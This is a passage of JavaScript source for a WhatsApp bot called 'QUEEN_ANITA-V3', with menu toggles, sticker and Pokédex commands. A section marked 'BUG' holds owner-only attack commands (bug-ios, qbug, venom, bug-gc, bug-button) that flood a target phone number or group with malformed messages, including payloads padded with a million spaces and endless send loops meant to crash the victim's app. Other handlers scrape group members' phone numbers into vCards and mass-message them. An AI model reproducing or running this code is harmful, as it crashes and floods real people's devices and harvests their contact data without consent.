 title: 'Antilink Group [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinkgc off`
 },
 {
 title: 'Antilink Wa.me [ ON ]',
 description: "<!> Enable Feature",
 id: `${prefix}antiwame on`
 },
 {
 title: 'Antilink Wa.me [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antiwame off`
 },
 {
 title: 'Antilink Facebook [ ON ]',
 description: "<!> Display All Tools Feature",
 id: `${prefix}antilinkfb on`
 },
 {
 title: 'Antilink Facebook [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinkfb off`
 },
 {
 title: 'Antilink Tiktok [ ON ]',
 description: "<!> Enable Feature",
 id: `${prefix}antilinktt on`
 },
 {
 title: 'Antilink Tiktok [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinktt off`
 },
 {
 title: 'Antilink Telegram [ ON ]',
 description: "<!> Enable Feature",
 id: `${prefix}antilinktele on`
 },
 {
 title: 'Antilink Telegram [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinktele off`
 }, 
 {
 title: 'Antilink Twiter [ ON ]',
 description: "<!> Enable Feature",
 id: `${prefix}antilinktwit on`
 }, 
 {
 title: 'Antilink Twiter [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinktwit off`
 },
 {
 title: 'Antilink Yt vid [ ON ]',
 description: "<!> Enable Feature",
 id: `${prefix}antilinkytvid on`
 }, 
 {
 title: 'Antilink Yt Vid [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinkytvid off`
 },
 {
 title: 'Antilink Yt ch [ ON ]',
 description: "<!> Enable Feature",
 id: `${prefix}antilinkytch on`
 }, 
 {
 title: 'Antilink Yt ch [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinkytch off`
 }]
}]

let listMessage = {
 title: "Selection",
 sections
};

let msghhhhhhhhhhhhhhhhhhhk = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m?.sender],
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '12036326753195844@newsletter',
 newsletterName: `QUEEN_ANITA-V3 • ${runtime(process.uptime())}`,
 serverMessageId: -1
 },
 businessMessageForwardInfo: {
 businessOwnerJid: ptz.decodeJid(ptz.user.id)
 },
 externalAdReply: {
 title: '⟡ Q U E E N  • A N I T A - V 1 ⟡',
 body: "New Bot Project •",
 thumbnailUrl: "https://imgur.com/a/PD8nT5X",
 sourceUrl: '',
 mediaType: 1,
 renderLargerThumbnail: true
 }
 },
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `© David-Cyril `
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 thumbnailUrl: "",
 gifPlayback: true,
 subtitle: "QUEEN_ANITA-V3",
 hasMediaAttachment: false,
 /*...(await prepareWAMessageMedia({
 document: fs.readFileSync('./package.json'),
 mimetype: "application/msword",
 jpegThumbnail:fs.readFileSync("./thum.jpg"),
fileName: "QUEEN_ANITA-V3™",
 }, {
 upload: ptz.waUploadToServer
 }))*/
 }),
 gifPlayback: true,
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [{
 "name": "single_select",
 "buttonParamsJson": JSON.stringify(listMessage)
 }]
 })
 })
 }
 }
}, {
 quoted: fsaluran
});

await ptz.relayMessage(msghhhhhhhhhhhhhhhhhhhk.key.remoteJid, msghhhhhhhhhhhhhhhhhhhk.message, {
 messageId: msghhhhhhhhhhhhhhhhhhhk.key.id
});
} catch(err) {
console.clear()
}
break

case 'mode': case 'self': case 'public':
if (!isCreator) return
try {
 let sections = [{
		title: '- SELECT MODE -', 
		rows: [{
	 title: '[ PUBLIC ]',
 	description: `<!> Switch QUEEN_ANITA-V3 Mode To Public...`, 
 	id: `${prefix}mode-public`
 }, 
 {
 title: ' [ PRIVATE ]',
 description: "<!> Switch QUEEN_ANITA-V3 Mode To Private....",
 id: `${prefix}mode-private`
 }]
}]

let listMessage = {
title: 'CLICK ME',
 sections
};

let msghhhhhhhhhhhhhhhhhhhk = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m?.sender],
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '12036326753195844@newsletter',
 newsletterName: `QUEEN_ANITA-V3 • ${runtime(process.uptime())}`,
 serverMessageId: -1
 },
 businessMessageForwardInfo: {
 businessOwnerJid: ptz.decodeJid(ptz.user.id)
 },
 externalAdReply: {
 title: '⟡ Q U E E N  • A N I T A - V 1 ⟡',
 body: "New Bot Project •",
 thumbnailUrl: "https://imgur.com/a/PD8nT5X",
 sourceUrl: '',
 mediaType: 1,
 renderLargerThumbnail: true
 }
 },
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `© David-Cyril `
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 thumbnailUrl: "",
 gifPlayback: true,
 subtitle: "QUEEN_ANITA-V3",
 hasMediaAttachment: false,
 /*...(await prepareWAMessageMedia({
 document: fs.readFileSync('./package.json'),
 mimetype: "application/msword",
 jpegThumbnail:fs.readFileSync("./thum.jpg"),
fileName: "QUEEN_ANITA-V3™",
 }, {
 upload: ptz.waUploadToServer
 }))*/
 }),
 gifPlayback: true,
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [{
 "name": "single_select",
 "buttonParamsJson": JSON.stringify(listMessage)
 }]
 })
 })
 }
 }
}, {
 quoted: fsaluran
});

await ptz.relayMessage(msghhhhhhhhhhhhhhhhhhhk.key.remoteJid, msghhhhhhhhhhhhhhhhhhhk.message, {
 messageId: msghhhhhhhhhhhhhhhhhhhk.key.id
});
} catch(err) {
console.clear()
}
break 

case 'mode': case 'self': case 'public':
if (!isCreator) return
try {
 let sections = [{
		title: '- SELECT MODE -', 
		rows: [{
	 title: '[ PUBLIC ]',
 	description: `<!> Switch QUEEN_ANITA-V3 Mode To Private...`, 
 	id: `${prefix}mode-public`
 }, 
 {
 title: ' [ PRIVATE ]',
 description: "<!> Switch QUEEN_ANITA-V3 Mode To Private....",
 id: `${prefix}mode-private`
 }]
}]

let listMessage = {
title: 'CLICK ME',
 sections
};

let msghhhhhhhhhhhhhhhhhhhk = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m?.sender],
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '12036326753195844@newsletter',
 newsletterName: `QUEEN_ANITA-V3 • ${runtime(process.uptime())}`,
 serverMessageId: -1
 },
 businessMessageForwardInfo: {
 businessOwnerJid: ptz.decodeJid(ptz.user.id)
 },
 externalAdReply: {
 title: '⟡ Q U E E N  • A N I T A - V 1 ⟡',
 body: "New Bot Project •",
 thumbnailUrl: "https://imgur.com/a/PD8nT5X",
 sourceUrl: '',
 mediaType: 2,
 renderLargerThumbnail: true
 }
 },
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `© David-Cyril `
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 thumbnailUrl: "",
 gifPlayback: true,
 subtitle: "QUEEN_ANITA-V3",
 hasMediaAttachment: false,
 /*...(await prepareWAMessageMedia({
 document: fs.readFileSync('./package.json'),
 mimetype: "application/msword",
 jpegThumbnail:fs.readFileSync("./thum.jpg"),
fileName: "QUEEN_ANITA-V3™",
 }, {
 upload: ptz.waUploadToServer
 }))*/
 }),
 gifPlayback: true,
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [{
 "name": "single_select",
 "buttonParamsJson": JSON.stringify(listMessage)
 }]
 })
 })
 }
 }
}, {
 quoted: fsaluran
});

await ptz.relayMessage(msghhhhhhhhhhhhhhhhhhhk.key.remoteJid, msghhhhhhhhhhhhhhhhhhhk.message, {
 messageId: msghhhhhhhhhhhhhhhhhhhk.key.id
});
} catch(err) {
console.clear()
}
break 

case'smeta': {
function makeid(length) {
let result = "";
const characters =
"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
const charactersLength = characters.length;

for (let i = 0; i < length; i++) {
result += characters.charAt(
Math.floor(Math.random() * charactersLength),
);
}
return result;
}
async function addExifAvatar(
 buffer,
 packname,
 author,
 categories = [""],
 extra = {},
) {
 const {
default: { Image },
 } = await import("node-webpmux");
 const img = new Image();
 const json = {
"sticker-pack-id": "Natsxe",
"sticker-pack-name": packname,
"sticker-pack-publisher": author,
emojis: categories,
"is-avatar-sticker": 1,
...extra,
 };
 let exifAttr = Buffer.from([
0x49, 0x49, 0x2a, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57,
0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00,
 ]);
 let jsonBuffer = Buffer.from(JSON.stringify(json), "utf8");
 let exif = Buffer.concat([exifAttr, jsonBuffer]);
 exif.writeUIntLE(jsonBuffer.length, 14, 4);
 await img.load(buffer);
 img.exif = exif;
 return await img.save(null);
 }
 

 var stiker = false
 try {
 let [packname, ...author] = q.split('|')
 //var author = (author []).join('|')
 let mime = m.quoted.mimetype || ''
 if (!/webp/.test(mime)) throw reply('Reply sticker!')
 //let img = await q.download()
 let img = await ptz.downloadAndSaveMediaMessage(quoted, makeid(5))
 if (!img) throw 'Reply a sticker!'
 var stiker = await addExifAvatar(img, `David Cyril`, `${pushname}`)
 } catch (e) {
 console.error(e)
 if (Buffer.isBuffer(e)) stiker = e
 } finally {
 if (stiker) ptz.sendMessage(m.chat, {
 sticker: stiker
 }, {
 quoted: m
 })
 else throw 'reply sticker'
 }
 }
 
 break

case "pokedex": case "pokemon-search":
try {
 const url = `https://some-random-api.com/pokemon/pokedex?pokemon=pikachu`;

const response = await fetch(url);

const json = await response.json();

if (!response.ok) {

throw `An error occurred: ${json.error}`;

}

const message = ` *${m2}- Pokemon Search -${m2}*
e> *Name:* ${json.name}
e> *ID:* ${json.id}
e> *Type:* ${json.type}
e> *Abilities:* ${json.abilities}
e> *Height:* ${json.height}
e> *Weight:* ${json.weight}

 *Description:* ${json.description}`;

reply (message)
} catch (e) {
    reply ("rusak, cari pokemon yang benar.")
    }
break




//======// BUG
case 'bug-ios': case 'bugios': {
if (!isCreator) return
if (!q) return reply(`Usage .${command} 2347043759577|1\n\n_# enter 1 equals 300.Second_`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Please Make Use Of Your Counrty Code\n\n<✓> Example : .${command} 2347043759577|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
reply(ppk + " Second");
reply("Wait...")
for (let j = 0; j < jumlah; j++) {
await aipong(target)
await sleep(1500)
}
reply(`Successfully Sent Bug To ${target} within a period of time ${ppk} Second`)
}
break

case 'q-ios': case 'qios': {
if (!isCreator) return 
if (!q) return reply(`Usage .${command} 2347043759577`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Please Make Use Of Your Counrty Code\n\n<✓> Example : .${command} 2347043759577`)
await reply("Processing...")
let target = bijipler + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break

case 'q-bug': case 'qbug': {
if (!isCreator) return 
if (!q) return reply(`Ex: .${command} 2347043759577`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Please Make Use Of Your Counrty Code\n\n<✓> Example : .${command} 2347043759577`)
let target = bijipler + '@s.whatsapp.net'
await reply("Processing...")
for (;;) {
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await sleep(30000)
}
}
break

case '1hit': {
if (!isCreator) return 

let target = text + '@s.whatsapp.net'
for (let j = 0; j < 1; j++) {

ptz.sendMessage(target, {text: "           "}, {quoted:ryobug})

}
await reply('Succes')
}
break

case 'qforce': {
if (!isCreator) return 
let target = text + '@s.whatsapp.net'
for (let j = 0; j < 5; j++) {

ptz.sendMessage(target, {text: "          "}, {quoted:ryobug})
await sleep(3000)
}
await reply('Succes')
}
break

case '1kill': {
if (!isCreator) return 

let target = text + '@s.whatsapp.net'
for (let j = 0; j < 1; j++) {

await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)

}
await reply('Succes')
}
break

case 'dcx': {
if (!isCreator) return 
if (!q) return reply(`Usage .${command} 23490563xxx 1`)
for (let j = 0; j < q; j++) {

await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)

}
await reply('Succes')
}
break

    case "venom": case "venom": {
if (!isCreator) return 
if (!text) return reply(`Usage .${command} 2347043759577`)
let bijipler = text.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Please  Make Use Of Your Country Code\n\n<✓> Example : .${command} 2347043759577`)
let target = bijipler + '@s.whatsapp.net'
await reply("wait..")
for (let j = 0; j < 20; j++) {
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler}.`)
}
break
    
case 'bug-gc': case 'x-gc': {
if (!isCreator) return 
if (!q) return reply(`Usage .${command} 1962623836281@g.us\n\nDon't know? Type .checkgc`)
target = q
kirimstik("https://imgur.com/a/PD8nT5X")
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #s-stuck"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝐙͢𝐱𝐕⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await ptz.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target}\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break



case 'bugloc': {
if (!iisCreator) return 
if (!q) return reply(`Usage .${command} 1`)
for (let j = 0; j < q; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: m.chat, quoted: m })
await ptz.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
}
await reply('Succes')
}
break

case 'bug-button': case 'bug-browser': {
if (!isCreator) return reply(`For My Owner Only`)
if (!q) return reply(`Usage .${command} https://chat.whatsapp.com/`)
reply("wait...")
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await ptz.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #QUEEN_ANITA-V3Bug"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝐙͢𝐱𝐕⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(100000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await ptz.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target}\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//========//

case 'addcase': {
                if (!isCreator) return reply('?')
    if (!text) return ('Add the case you want to input');
const namaFile = './message.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('An error occurred while reading the file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Error File:', err);
            } else {
                reply('Success Adding case');
            }
        });
    } else {
        reply('Failed to Add case');
    }
});

}
break;
case 'gimage': case "ai-search":{
if (!text) return reply(`Example : ${prefix + command} Dogs`)
let gis = require('g-i-s')
gis(text, async (error, result) => {
let n = result
let images = n[Math.floor(Math.random() * n.length)].url
ptz.sendMessage(m.chat, { image: { url: images}, caption: `${text}`}, { quoted:fsaluran })
})
}
break

    
    
    
    
    
    
   
    
    
   
    
    
    
    
    
    
    // pushkontak 
    
  // KNP GA ADA REPLY ATAU BALASAN PROSES? , KARNA SAYA INGIN KE 1 TUJUAN DAN GA NGABISIN WAKTU
  
  // zio
  


case 'checkgc': {

let getGroups = await ptz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST OF GROUP BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await ptz.groupMetadata(x)
teks += `◉ Name : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `*Please Copy the Group ID Above*`)
}
break

case "pushcontactv1":{
if (!isCreator) return reply("Ouh")
if (isGroup) return reply("special di Chat Pribadi")
if (!text) return reply(`Wrong Usage Please Use Command Like This\n${prefix+command} idgroup|tekspushContacts\nTo see the group ID, please type .checkgc`)

const groupMetadataa = !isGroup? await ptz.groupMetadata(`${text.split("|")[0]}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkon = text.split("|")[1]
if (isContacts) return
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await ptz.downloadAndSaveMediaMessage(quoted)
memk = await TelegraPh(media)
await ptz.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(1000)
} else {
await ptz.sendMessage(mem, { text: global.tekspushkon })
await sleep(1000)
}
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN: CONTACT ${createSerial(1)}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await ptz.sendMessage(from, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Here Sir Just Click on the File Above Continue Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushcontactv2":{
if (!isCreator) return reply("Ouh")
if (!isGroup) return reply("Khusu Di Group")
if (!text) return reply(`Wrong Usage Please Use Command Like This\n${prefix+command} teks`)

const groupMetadata = isGroup? await ptz.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv2 = text
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await ptz.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)

setTimeout(async () => {
 ptz.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
}, 2100)
} else {
setTimeout(async () => {
ptz.sendMessage(men, { text: global.tekspushkonv2 })
}, 2100)
}
}
reply("File Contacts Already Di Kirim Lewat Chat Pribadi")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN: CONTACT ${createSerial(1)}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await ptz.sendMessage(sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Here Sir Just Click on the File Above Continue Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushcontactv3":
if (!isCreator) return reply("Ouh")
if (!text) return reply(`Wrong Usage Please Use Command Like This\n${prefix+command} idgroup|pause|text\nTo see the group ID, please type .group`)
console.log("?") //   ini pengalih
const groupMetadataa = !isGroup? await ptz.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participantss = !isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv3 = q.split("|")[2]
for (let mem of halls) {
if (/image/.test(mime)) {
media = await ptz.downloadAndSaveMediaMessage(quoted)
memk = await TelegraPh(media)

setTimeout(async () => {
 ptz.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv3 })
}, q.split("|")[1])

} else {
setTimeout(async () => {
ptz.sendMessage(mem, { text: global.tekspushkonv3 })
}, q.split("|")[1])
}
}
reply("Success")
break
case "pushcontactv4":
if (!isCreator) return reply("Ouh")
if (isGroup) return reply("Specially in Private Chat")
if (!text) return reply(`Wrong Usage Please Use Command Like This\n${prefix+command} pause|text`)
console.log('?') // ini juga pengalih
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await ptz.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPH(media)

setTimeout(async () => {
 ptz.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
}, text.split("|")[0])
} else {
setTimeout(async () => {
await ptz.sendMessage(men, { text: global.tekspushkonv4 })
}, text.split("|")[0])
}
}
reply("Success")
break
case "savecontactv1": {
if (!isCreator) return reply("Ouh")
if (!text) return reply(`Sorry Sir Features ${prefix+command} HanyaCan Only Be Used Within Groups\nTo Insert Bot Into Desired Group\nPlease type the command .join linkgroup`)

const groupMetadata = isGroup? await ptz.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (isContacts) return
contacts.push(men)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}
reply("Success File Already Sent Via Private Chat ")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN: CONTACT ${createSerial(2)}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await ptz.sendMessage(sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Success Just Save Yes Sir", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break
case 'getcontact': case 'getkontak':
if (!isCreator) return reply("Ouh")
if (!isGroup) return reply(`Khusus Group`)
huhuhs = await ptz.sendMessage(m.chat, {
    text: `Grup; *${groupMetadata.subject}*\nTotal participant; *${participants.length}*\n\nSending contact...`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) 
ptz.sendContact(m.chat, participants.map(a => a.id), huhuhs)
break
case 'savekontak': case 'svkontak':
if (!isCreator) return reply("Ouh")
if (!isGroup) return reply(`Khusus Group`)
let cmiggc = await ptz.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './database/contacts.vcf'
reply('*Import '+cmiggc.participants.length+' kontak..*')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
ptz.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
break
case 'sendkontak': case 'kontak':
if (!isCreator) return reply("Ouh")
if (!isGroup) return reply("Harus di  grup")
if (!m.mentionedJid[0]) return reply('Example: .Contacts @tag|Name')
let snTak = dtext.split(' ')[1] ? dtext.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile Phone\nEND:VCARD"}]
}
ptz.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
break
case "savecontactv2": {
if (!isCreator) return reply("Ouh")
if (isGroup) return reply("Special In Private Chat")
if (!text) return reply(`Wrong Usage Please Use Command Like This\n${prefix+command} idgroup\nTo see the group ID, please type .checkgc`)

const groupMetadataa = !isGroup? await ptz.groupMetadata(`${text}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN: CONTACT ${createSerial(2)}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await ptz.sendMessage(from, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Success Just Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break
    
    // jangan oplek
    case 'QUEEN_ANITA-V3':
        let chattttkkkkk = db.data.chats[m.chat];
    let argsssskkkkk = m.text.split(' ');
    
            await handleVeemonCommand(m, chattttkkkkk, argsssskkkkk);
            break;
    // ====== //
default:
